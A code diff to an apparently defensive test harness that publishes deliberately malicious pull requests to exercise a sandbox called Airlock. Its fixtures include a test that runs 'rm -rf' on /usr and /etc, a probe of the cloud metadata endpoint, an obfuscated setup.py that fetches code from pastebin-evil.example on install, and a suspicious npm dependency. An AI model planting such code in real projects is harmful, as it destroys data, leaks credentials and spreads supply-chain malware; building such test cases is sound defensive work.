@@ -46,7 +46,7 @@ CASES: list[dict] = [
             "README.md": "# clean-lib\nA tiny helper library used by the Airlock demo.\n",
             "pyproject.toml": '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n\n[project]\nname = "clean-lib"\nversion = "0.1.0"\n',
             "src/cleanlib/__init__.py": "",
-            "tests/test_clamp.py": "from cleanlib import clamp\n\ndef test_clamp_inside():\n    assert clamp(5, 0, 10) == 5\n",
+            "tests/test_clamp.py": "import cleanlib\n\ndef test_importable():\n    assert cleanlib is not None\n",
         },
         pr={
             "src/cleanlib/__init__.py": "def clamp(v, lo, hi):\n    \"\"\"Clamp v into [lo, hi].\"\"\"\n    return max(lo, min(hi, v))\n",
@@ -119,7 +119,7 @@ CASES: list[dict] = [
             "tests/test_ok.py": "from setupfail import ok\n\ndef test_ok():\n    assert ok()\n",
         },
         pr={
-            "requirements-wrong.txt": "requests\n",
+            "requirements-wrong.txt": "no-such-package-anywhere==9.9.9\n",
         },
         fillers=4,
     ),
@@ -172,12 +172,12 @@ CASES: list[dict] = [
         body="Adds an aggressive cleanup test. (Tries to delete paths outside the workspace — the sandbox rootfs is read-only.)",
         base={
             "README.md": "# rm-rf-test\n",
-            "pyproject.toml": '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n\n[project]\nname = "rm-rf-test"\nversion = "0.1.0"\n',
+            "pyproject.toml": '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n\n[project]\nname = "rm-rf-test"\nversion = "0.1.0"\n\n[tool.pytest.ini_options]\naddopts = "-s"\n',
             "src/rmtest/__init__.py": "def value():\n    return 1\n",
             "tests/test_value.py": "from rmtest import value\n\ndef test_value():\n    assert value() == 1\n",
         },
         pr={
-            "tests/test_cleanup.py": "import os\nimport subprocess\n\ndef test_cleanup():\n    # 'clean up' everything outside the project\n    subprocess.run(['rm', '-rf', '/usr'], check=False)\n    subprocess.run(['rm', '-rf', '/etc'], check=False)\n    assert True\n",
+            "tests/test_cleanup.py": "import subprocess\nimport sys\n\ndef test_cleanup():\n    # 'clean up' everything outside the project\n    for target in ('/usr', '/etc'):\n        r = subprocess.run(['rm', '-rf', target], capture_output=True, text=True)\n        # the denial itself is the evidence — put it on stderr where the sandbox record sees it\n        print(f'cleanup {target}: {r.stderr.strip()}', file=sys.stderr)\n    assert True\n",
         },
         fillers=7,
     ),
@@ -193,7 +193,7 @@ CASES: list[dict] = [
             "tests/test_cloud.py": "from cloudprobe import on_cloud\n\ndef test_not_cloud():\n    assert on_cloud() is False\n",
         },
         pr={
-            "tests/test_cloud.py": "import urllib.request\n\nfrom cloudprobe import on_cloud\n\ndef test_not_cloud():\n    assert on_cloud() is False\n\ndef test_metadata_endpoint():\n    try:\n        urllib.request.urlopen('http://169.254.169.254/latest/meta-data/', timeout=3)\n    except Exception:\n        pass\n",
+            "tests/test_cloud.py": "import urllib.request\n\nfrom cloudprobe import on_cloud\n\ndef test_not_cloud():\n    assert on_cloud() is False\n\ndef test_metadata_endpoint():\n    # loud on purpose: a silent probe leaves nothing in the sandbox record —\n    # the refused connection and its target must be on stderr to become evidence\n    try:\n        urllib.request.urlopen('http://169.254.169.254/latest/meta-data/', timeout=3)\n    except Exception as e:\n        raise AssertionError(f'cloud metadata probe to 169.254.169.254 refused: {e}')\n",
         },
         fillers=8,
     ),
@@ -289,7 +289,7 @@ CASES: list[dict] = [
             "tests/test_util.py": "from obfutils import util\n\ndef test_util():\n    assert util() == 1\n",
         },
         pr={
-            "x:setup.py": "import base64\nimport subprocess\n\n# 'update check' — obfuscated so nobody reads it\ncode = base64.b64decode(b'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9wYXN0ZWJpbi1ldmlsLmV4YW1wbGUvcmF3JykK')\ntry:\n    exec(code)\nexcept Exception:\n    pass\n\nfrom setuptools import setup\nsetup(name='obfuscated-exec', version='0.2.0', packages=['obfutils'])\n",
+            "x:setup.py": "import base64\nimport subprocess\n\n# 'update check' — obfuscated so nobody reads it\ncode = base64.b64decode(b'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9wYXN0ZWJpbi1ldmlsLmV4YW1wbGUvcmF3JykK')\ntry:\n    exec(code)\nexcept Exception as _e:\n    import sys\n    print(f'update-check to pastebin-evil.example failed: {_e}', file=sys.stderr)\n    raise\n\nfrom setuptools import setup\nsetup(name='obfuscated-exec', version='0.2.0', packages=['obfutils'])\n",
             "src/obfutils/__init__.py": "def util():\n    return 1\n",
         },
         fillers=14,
@@ -311,7 +311,7 @@ CASES: list[dict] = [
         pr={
             "package.json": json.dumps({
                 "name": "known-malicious-dep", "version": "0.2.0",
-                "dependencies": {"imaginary-exfil-pkg": "1.0.1"},
+                "dependencies": {"frd-rsa-js": "*"},
                 "scripts": {"test": "node --test tests/"},
             }, indent=2) + "\n",
         },
@@ -495,6 +495,9 @@ def publish_case(case: dict, dry: bool = False) -> dict:
                          "-f", f"title={case['title']}", "-f", "head=pr", "-f", "base=main",
                          "-F", f"body={case['body']}"])
             else:
+                if pr.get("state") != "open":
+                    gh_json(["repos", ORG, name, "pulls", str(target_pr), "-X", "PATCH",
+                             "-F", "state=open"])
                 gh_json(["repos", ORG, name, "pulls", str(target_pr), "-X", "PATCH",
                          "-f", f"title={case['title']}", "-F", f"body={case['body']}"])
         url = f"https://github.com/{ORG}/{name}/pull/{target_pr}"
